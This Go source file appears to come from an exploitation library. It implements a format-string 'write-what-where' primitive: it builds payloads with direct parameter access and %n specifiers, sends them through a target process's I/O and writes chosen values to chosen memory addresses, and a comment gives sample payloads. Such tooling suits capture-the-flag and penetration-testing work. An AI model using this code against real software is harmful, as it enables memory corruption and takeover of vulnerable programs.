package memory

import (
	"bytes"
	"fmt"
)

// %192p%9$n%16197p%10$n
// %192p|%9$n|
type DPAFormatStringWriterConfig struct {
	MaxWrite  int
	DPAConfig FormatStringDPAConfig
}

func NewDPAFormatStringWriterOrExit(config DPAFormatStringWriterConfig) *DPAFormatStringWriter {
	w, err := NewDPAFormatStringWriter(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create new dpa format string writer - %w", err))
	}
	return w
}

func NewDPAFormatStringWriter(config DPAFormatStringWriterConfig) (*DPAFormatStringWriter, error) {
	if config.MaxWrite <= 0 {
		return nil, fmt.Errorf("maximum write size cannot be less than or equal to zero")
	}

	leakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(dpaLeakSetupConfig{
		dpaConfig: config.DPAConfig,
		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
			fmtStrBuilder := formatStringBuilder{
				prefixAndSuffix:  []byte("|"),
				endOfStringDelim: []byte("foozlefu"),
				pointerSize:      config.DPAConfig.PointerSize,
			}
			buff := bytes.NewBuffer(nil)
			fmtStrBuilder.appendDPAWrite(config.MaxWrite, config.DPAConfig.MaxNumParams, []byte("p"), buff)
			return fmtStrBuilder, stringLenMemoryAligned(buff.Bytes(), config.DPAConfig.PointerSize)
		},
	})
	if err != nil {
		return nil, err
	}

	return &DPAFormatStringWriter{
		config:     config,
		leakConfig: leakConfig,
	}, nil
}

type DPAFormatStringWriter struct {
	config     DPAFormatStringWriterConfig
	leakConfig *dpaLeakConfig
}

func (o DPAFormatStringWriter) WriteAtOrExit(i int, pointer Pointer) {
	err := o.WriteAt(i, pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			i, pointer.HexString(), err))
	}
}

func (o DPAFormatStringWriter) WriteAt(i int, pointer Pointer) error {
	if i > o.config.MaxWrite {
		return fmt.Errorf("the specified write size of %d cannot be greater than the configured max of %d",
			i, o.config.MaxWrite)
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(i, o.leakConfig.paramNum, []byte{'n'}, buff)

	_, err := leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(o.leakConfig.builder.build(o.leakConfig.alignLen, buff), pointer...),
		o.leakConfig.builder)
	return err
}
